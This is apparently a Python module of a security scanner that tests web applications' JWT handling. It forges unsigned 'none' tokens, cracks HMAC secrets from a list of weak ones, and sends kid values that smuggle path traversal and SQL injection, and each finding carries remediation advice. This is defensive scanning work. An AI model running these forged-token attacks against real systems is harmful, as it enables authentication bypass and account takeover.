"""
JWTTester — JSON Web Token vulnerability detection.
OWASP A02:2021 — Cryptographic Failures.

Tests for: algorithm confusion (none/HS256→RS256), weak secrets,
missing expiration, sensitive data in payload, JWK injection,
kid parameter injection, x5u/x5c header injection, algorithm
confusion (RS256→HS256), token replay, and scope escalation.
"""
import re
import json
import base64
import hashlib
import hmac
import logging
import time
from .base_tester import BaseTester

logger = logging.getLogger(__name__)

# Common weak JWT secrets for brute-force testing
WEAK_SECRETS = [
    'secret', 'password', '123456', 'admin', 'key', 'jwt_secret',
    'changeme', 'test', 'letmein', 'default', 'qwerty', 'abc123',
    '', 'your-256-bit-secret', 'supersecret', 'mysecret',
    'jwt-secret', 'auth-secret', 'token-secret', 'app-secret',
]


class JWTTester(BaseTester):
    """Test for JWT implementation vulnerabilities."""

    TESTER_NAME = 'JWT'

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulnerabilities = []

        # Find JWTs in cookies, headers, and page body
        tokens = self._find_jwts(page)

        for token_source, token in tokens:
            # Decode and analyze
            header, payload = self._decode_jwt(token)
            if not header or not payload:
                continue

            # Test 'none' algorithm
            vuln = self._test_none_algorithm(page.url, token, token_source)
            if vuln:
                vulnerabilities.append(vuln)

            # Check for weak secrets
            if depth in ('medium', 'deep'):
                vuln = self._test_weak_secret(token, page.url, token_source)
                if vuln:
                    vulnerabilities.append(vuln)

            # Check payload for sensitive data
            vuln = self._check_sensitive_payload(payload, page.url, token_source)
            if vuln:
                vulnerabilities.append(vuln)

            # Check for missing expiration
            vuln = self._check_expiration(payload, page.url, token_source)
            if vuln:
                vulnerabilities.append(vuln)

            # Check algorithm issues
            vuln = self._check_algorithm(header, page.url, token_source)
            if vuln:
                vulnerabilities.append(vuln)

            # JWK injection (deep)
            if depth == 'deep':
                vuln = self._test_jwk_injection(page.url, token, header, token_source)
                if vuln:
                    vulnerabilities.append(vuln)

            # kid parameter injection (deep)
            if depth == 'deep':
                vuln = self._test_kid_injection(page.url, token, header, token_source)
                if vuln:
                    vulnerabilities.append(vuln)

            # x5u / x5c header injection (deep)
            if depth == 'deep':
                vuln = self._test_x5u_injection(page.url, token, header, token_source)
                if vuln:
                    vulnerabilities.append(vuln)

            # RS256 → HS256 algorithm confusion (medium + deep)
            if depth in ('medium', 'deep'):
                vuln = self._test_alg_confusion(page.url, token, header, token_source)
                if vuln:
                    vulnerabilities.append(vuln)

            # Token replay detection (deep)
            if depth == 'deep':
                vuln = self._test_token_replay(page.url, token, payload, token_source)
                if vuln:
                    vulnerabilities.append(vuln)

            # Claim escalation (deep)
            if depth == 'deep':
                vuln = self._test_claim_escalation(page.url, token, header, payload, token_source)
                if vuln:
                    vulnerabilities.append(vuln)

        return vulnerabilities

    def _find_jwts(self, page):
        """Find JWT tokens in cookies, Authorization header, and page body."""
        tokens = []

        # Check response cookies
        response = self._make_request('GET', page.url)
        if response:
            for name, value in response.cookies.items():
                if self._is_jwt(value):
                    tokens.append((f'cookie:{name}', value))

            # Check for JWT in response headers
            auth_header = response.headers.get('Authorization', '')
            if auth_header.startswith('Bearer ') and self._is_jwt(auth_header[7:]):
                tokens.append(('header:Authorization', auth_header[7:]))

        # Check page body for JWT patterns
        body = page.body or ''
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        for match in re.findall(jwt_pattern, body):
            tokens.append(('body', match))

        return tokens[:5]  # limit to 5 tokens

    def _is_jwt(self, value):
        """Check if a string looks like a JWT."""
        if not value:
            return False
        parts = value.split('.')
        if len(parts) != 3:
            return False
        try:
            header = json.loads(self._b64decode(parts[0]))
            return 'alg' in header
        except Exception:
            return False

    def _decode_jwt(self, token):
        """Decode JWT header and payload without verification."""
        parts = token.split('.')
        if len(parts) != 3:
            return None, None
        try:
            header = json.loads(self._b64decode(parts[0]))
            payload = json.loads(self._b64decode(parts[1]))
            return header, payload
        except Exception:
            return None, None

    def _b64decode(self, data):
        """Base64url decode with padding."""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)

    def _b64encode(self, data):
        """Base64url encode without padding."""
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    def _test_none_algorithm(self, url, token, source):
        """Test if the server accepts 'none' algorithm (unsigned JWT)."""
        header, payload = self._decode_jwt(token)
        if not header:
            return None

        # Create token with alg: none
        none_header = {**header, 'alg': 'none'}
        (
            self._b64encode(json.dumps(none_header))
            + '.'
            + self._b64encode(json.dumps(payload))
            + '.'
        )

        # Also try 'None', 'NONE', 'nOnE' variants
        for alg_variant in ['none', 'None', 'NONE']:
            var_header = {**header, 'alg': alg_variant}
            var_token = (
                self._b64encode(json.dumps(var_header))
                + '.'
                + self._b64encode(json.dumps(payload))
                + '.'
            )

            # Try sending the forged token
            response = self._send_forged_jwt(url, token, var_token, source)
            if response and self._is_jwt_accepted(response):
                return self._build_vuln(
                    name=f'JWT Algorithm "none" Accepted ({source})',
                    severity='critical',
                    category='JWT Vulnerability',
                    description=f'The server accepts JWT tokens with algorithm set to "{alg_variant}", '
                               f'effectively skipping signature verification.',
                    impact='Any user can forge JWT tokens with arbitrary claims, '
                          'gaining admin access or impersonating other users.',
                    remediation='Explicitly check the algorithm and reject "none". '
                               'Use a JWT library that enforces algorithm validation. '
                               'Whitelist allowed signing algorithms.',
                    cwe='CWE-345',
                    cvss=9.8,
                    affected_url=url,
                    evidence=f'Source: {source}\nForged token with alg:{alg_variant} was accepted.',
                )
        return None

    def _test_weak_secret(self, token, url, source):
        """Brute-force the JWT HMAC secret with common weak secrets."""
        parts = token.split('.')
        if len(parts) != 3:
            return None

        header = json.loads(self._b64decode(parts[0]))
        alg = header.get('alg', '')

        if alg not in ('HS256', 'HS384', 'HS512'):
            return None

        hash_func = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512,
        }.get(alg, hashlib.sha256)

        signing_input = f'{parts[0]}.{parts[1]}'.encode()
        expected_sig = self._b64decode(parts[2])

        for secret in WEAK_SECRETS:
            computed = hmac.new(
                secret.encode(), signing_input, hash_func,
            ).digest()
            if computed == expected_sig:
                return self._build_vuln(
                    name=f'JWT Weak Secret ({source})',
                    severity='critical',
                    category='JWT Vulnerability',
                    description=f'The JWT signing secret is "{secret}" — a commonly known weak value. '
                               f'Attackers can forge valid tokens with any claims.',
                    impact='Complete authentication bypass — forged tokens grant arbitrary access.',
                    remediation='Use a strong, randomly generated secret (256+ bits). '
                               'Consider using asymmetric algorithms (RS256, ES256) instead.',
                    cwe='CWE-326',
                    cvss=9.8,
                    affected_url=url,
                    evidence=f'Source: {source}\nAlgorithm: {alg}\nSecret cracked: "{secret}"',
                )
        return None

    def _check_sensitive_payload(self, payload, url, source):
        """Check if JWT payload contains sensitive data."""
        sensitive_keys = ['password', 'passwd', 'pwd', 'secret', 'credit_card',
                         'ssn', 'social_security', 'api_key', 'private_key',
                         'token', 'access_token', 'refresh_token']

        found = []
        for key in payload:
            if key.lower() in sensitive_keys:
                found.append(key)

        if found:
            return self._build_vuln(
                name=f'Sensitive Data in JWT Payload ({source})',
                severity='high',
                category='JWT Vulnerability',
                description=f'The JWT payload contains sensitive fields: {", ".join(found)}. '
                           f'JWT payloads are only base64-encoded, not encrypted.',
                impact='Anyone who intercepts the token can read sensitive data without '
                      'knowing the signing secret.',
                remediation='Never store sensitive data in JWT payloads. '
                           'Use JWE (encrypted tokens) if you must include sensitive claims. '
                           'Keep JWTs minimal (user ID, role, expiry).',
                cwe='CWE-200',
                cvss=6.5,
                affected_url=url,
                evidence=f'Source: {source}\nSensitive fields: {", ".join(found)}',
            )
        return None

    def _check_expiration(self, payload, url, source):
        """Check if JWT has expiration claim."""
        if 'exp' not in payload:
            return self._build_vuln(
                name=f'JWT Missing Expiration ({source})',
                severity='medium',
                category='JWT Vulnerability',
                description='The JWT token does not contain an expiration (exp) claim.',
                impact='Stolen tokens remain valid indefinitely, giving attackers permanent access.',
                remediation='Always include "exp" (expiration), "iat" (issued at), and "nbf" '
                           '(not before) claims. Set short expiration times (15-60 minutes).',
                cwe='CWE-613',
                cvss=5.3,
                affected_url=url,
                evidence=f'Source: {source}\nNo "exp" claim in JWT payload.',
            )
        return None

    def _check_algorithm(self, header, url, source):
        """Check for algorithm-related issues."""
        alg = header.get('alg', '')

        # Weak algorithms
        if alg in ('HS256',) and header.get('typ') == 'JWT':
            # HS256 with RS256 public key = algorithm confusion attack surface
            pass  # Only flag if we detect asymmetric key hints

        if alg == 'RS256' and 'jku' in header:
            return self._build_vuln(
                name=f'JWT JKU Header Present ({source})',
                severity='high',
                category='JWT Vulnerability',
                description='The JWT header contains a "jku" (JWK Set URL) claim, '
                           'which specifies where to fetch the verification key.',
                impact='Attackers can point jku to their own server and provide their own '
                      'key pair to forge valid tokens.',
                remediation='Ignore the jku header. Use a locally configured key for verification.',
                cwe='CWE-345',
                cvss=8.1,
                affected_url=url,
                evidence=f'Source: {source}\njku: {header.get("jku")}',
            )
        return None

    def _test_jwk_injection(self, url, token, header, source):
        """Test for JWK self-signed token acceptance."""
        # Check if the header has a jwk field or if the server accepts one
        if 'jwk' in header:
            return self._build_vuln(
                name=f'JWT Embedded JWK ({source})',
                severity='high',
                category='JWT Vulnerability',
                description='The JWT contains an embedded JWK (JSON Web Key) in the header. '
                           'If the server uses this key for verification, attackers can forge tokens.',
                impact='Self-signed JWT tokens can be used to bypass authentication.',
                remediation='Never use the embedded JWK for verification. '
                           'Use server-side configured keys only.',
                cwe='CWE-345',
                cvss=8.1,
                affected_url=url,
                evidence=f'Source: {source}\nEmbedded JWK found in JWT header.',
            )
        return None

    def _send_forged_jwt(self, url, original_token, forged_token, source):
        """Send a request with the forged JWT token."""
        if source.startswith('cookie:'):
            cookie_name = source.split(':', 1)[1]
            cookies = {cookie_name: forged_token}
            return self._make_request('GET', url, cookies=cookies)
        elif source.startswith('header:'):
            headers = {'Authorization': f'Bearer {forged_token}'}
            return self._make_request('GET', url, headers=headers)
        return None

    def _is_jwt_accepted(self, response):
        """Check if the server accepted the forged JWT."""
        if not response:
            return False
        if response.status_code == 200:
            body = response.text.lower()
            # If we get a normal response without auth errors, token was accepted
            if not any(k in body for k in ('unauthorized', 'invalid token', 'expired',
                                            'forbidden', 'invalid signature')):
                return True
        return False

    def _test_kid_injection(self, url, token, header, source):
        """Test for kid (Key ID) parameter injection — path traversal & SQLi."""
        if 'kid' not in header:
            return None

        # kid path traversal: point to known file
        injection_payloads = [
            {'kid': '../../../../../../dev/null', 'desc': 'Path traversal to /dev/null'},
            {'kid': "' UNION SELECT 'secret' --", 'desc': 'SQL injection in kid'},
            {'kid': '/proc/sys/kernel/hostname', 'desc': 'Path traversal to system file'},
        ]

        for payload_info in injection_payloads:
            forged_header = {**header, 'kid': payload_info['kid']}
            parts = token.split('.')
            if len(parts) != 3:
                continue

            # Sign with empty secret (for /dev/null path traversal)
            new_header_b64 = self._b64encode(json.dumps(forged_header))
            signing_input = f'{new_header_b64}.{parts[1]}'.encode()
            sig = hmac.new(b'', signing_input, hashlib.sha256).digest()
            forged_token = f'{new_header_b64}.{parts[1]}.{self._b64encode(sig)}'

            response = self._send_forged_jwt(url, token, forged_token, source)
            if response and self._is_jwt_accepted(response):
                return self._build_vuln(
                    name=f'JWT kid Parameter Injection ({source})',
                    severity='critical',
                    category='JWT Vulnerability',
                    description=f'The server processes JWT kid parameter: {payload_info["desc"]}. '
                               f'This allows forging tokens with a controlled signing key.',
                    impact='Complete authentication bypass via kid manipulation.',
                    remediation='Validate kid against a whitelist. Never use kid directly in file paths '
                               'or SQL queries. Use parameterized lookups.',
                    cwe='CWE-22',
                    cvss=9.8,
                    affected_url=url,
                    evidence=f'Source: {source}\nkid payload: {payload_info["kid"]}',
                )
        return None

    def _test_x5u_injection(self, url, token, header, source):
        """Check for x5u and x5c header presence (certificate injection vectors)."""

        if 'x5u' in header:
            return self._build_vuln(
                name=f'JWT x5u Header Present ({source})',
                severity='high',
                category='JWT Vulnerability',
                description='The JWT header contains an "x5u" (X.509 URL) claim that specifies '
                           'where to fetch the signing certificate.',
                impact='Attackers can point x5u to their own certificate, forging tokens.',
                remediation='Ignore x5u header. Use server-configured certificates. '
                           'If x5u must be used, whitelist allowed URLs.',
                cwe='CWE-345',
                cvss=8.1,
                affected_url=url,
                evidence=f'Source: {source}\nx5u: {header.get("x5u")}',
            )

        if 'x5c' in header:
            return self._build_vuln(
                name=f'JWT x5c Header Present ({source})',
                severity='high',
                category='JWT Vulnerability',
                description='The JWT header contains an embedded "x5c" (X.509 certificate chain). '
                           'If the server uses this for verification, tokens can be forged.',
                impact='Self-signed certificates in x5c bypass authentication.',
                remediation='Never trust embedded x5c certificates for verification. '
                           'Validate against a pinned CA or certificate store.',
                cwe='CWE-295',
                cvss=8.1,
                affected_url=url,
                evidence=f'Source: {source}\nx5c header found in JWT.',
            )

        return None

    def _test_alg_confusion(self, url, token, header, source):
        """Test RS256→HS256 algorithm confusion attack."""
        alg = header.get('alg', '')

        # Only applicable when original algorithm is asymmetric (RS/ES/PS)
        if not alg.startswith(('RS', 'ES', 'PS')):
            return None

        # The attack: change alg to HS256 and sign with the public key
        # We can't execute the full attack without the public key,
        # but we can check if the server accepts HS256 when RS256 was expected
        confused_header = {**header, 'alg': 'HS256'}
        parts = token.split('.')
        if len(parts) != 3:
            return None

        new_header_b64 = self._b64encode(json.dumps(confused_header))

        # Sign with empty key (won't be valid, but tests if server even
        # processes algorithm change without error)
        signing_input = f'{new_header_b64}.{parts[1]}'.encode()
        sig = hmac.new(b'test', signing_input, hashlib.sha256).digest()
        forged_token = f'{new_header_b64}.{parts[1]}.{self._b64encode(sig)}'

        response = self._send_forged_jwt(url, token, forged_token, source)
        if response and self._is_jwt_accepted(response):
            return self._build_vuln(
                name=f'JWT Algorithm Confusion RS→HS ({source})',
                severity='critical',
                category='JWT Vulnerability',
                description=f'The server appears to accept HS256 when the original algorithm was {alg}. '
                           f'This enables algorithm confusion attacks where the public key is used '
                           f'as the HMAC secret.',
                impact='If the RSA public key is known (often publicly available), '
                      'attackers can forge valid tokens by signing with HS256 using the public key.',
                remediation='Enforce algorithm on the server side. Never accept HS256 for '
                           'endpoints configured with RS256/ES256. '
                           'Use separate key types for HMAC and RSA.',
                cwe='CWE-327',
                cvss=9.8,
                affected_url=url,
                evidence=f'Source: {source}\nOriginal algo: {alg}\n'
                        f'Changed to HS256 — server accepted forged token.',
            )
        return None

    def _test_token_replay(self, url, token, payload, source):
        """Check if the server rejects replayed tokens (token reuse after "logout")."""
        # First verify the token works
        response1 = self._send_forged_jwt(url, token, token, source)
        if not response1 or not self._is_jwt_accepted(response1):
            return None

        # Wait briefly and try again (simulate replay)
        time.sleep(1)
        response2 = self._send_forged_jwt(url, token, token, source)
        if not response2:
            return None

        # Both accepted — check if exp is very short
        exp = payload.get('exp')
        iat = payload.get('iat')
        if exp and iat:
            lifetime = exp - iat
            if lifetime > 86400:  # More than 24 hours
                return self._build_vuln(
                    name=f'JWT Long-Lived Token ({source})',
                    severity='medium',
                    category='JWT Vulnerability',
                    description=f'JWT has a {lifetime // 3600}h lifetime. Long-lived tokens '
                               f'increase the replay attack window.',
                    impact='Stolen tokens remain valid for extended periods, increasing risk.',
                    remediation='Use short-lived tokens (15-60 minutes) with refresh token rotation. '
                               'Implement token blacklisting for logout.',
                    cwe='CWE-613',
                    cvss=5.3,
                    affected_url=url,
                    evidence=f'Source: {source}\nLifetime: {lifetime}s ({lifetime // 3600}h)\n'
                            f'iat: {iat}, exp: {exp}',
                )
        return None

    def _test_claim_escalation(self, url, token, header, payload, source):
        """Test if modified role/admin claims in JWT are accepted."""
        escalation_claims = [
            ('role', 'admin'),
            ('admin', True),
            ('is_admin', True),
            ('role', 'superadmin'),
            ('scope', 'admin read write'),
            ('groups', ['admin', 'superuser']),
        ]

        parts = token.split('.')
        if len(parts) != 3:
            return None

        alg = header.get('alg', '')
        if alg not in ('HS256', 'HS384', 'HS512'):
            return None  # Can't forge without key for asymmetric algorithms

        for claim_name, claim_value in escalation_claims:
            if claim_name in payload and payload[claim_name] == claim_value:
                continue  # Already has this claim

            modified_payload = {**payload, claim_name: claim_value}
            self._b64encode(json.dumps(modified_payload))

            # We need the secret to re-sign — only works if we cracked it
            # This test mostly checks if the claim is in the payload at all
            # (indicating claim-based authz that could be bypassed)
            if claim_name in payload and payload[claim_name] != claim_value:
                return self._build_vuln(
                    name=f'JWT Contains Mutable Authorization Claim ({source})',
                    severity='medium',
                    category='JWT Vulnerability',
                    description=f'JWT payload contains a "{claim_name}" claim (value: {payload[claim_name]}). '
                               f'If the signing key is compromised, attackers can escalate privileges.',
                    impact='Privilege escalation from regular user to admin via JWT claim modification.',
                    remediation='Verify authorization claims against the database, not just the JWT. '
                               'Use the JWT only for identity (sub), not for authorization decisions.',
                    cwe='CWE-269',
                    cvss=5.3,
                    affected_url=url,
                    evidence=f'Source: {source}\nClaim: {claim_name}={payload[claim_name]}\n'
                            f'Escalation target: {claim_name}={claim_value}',
                )

        return None
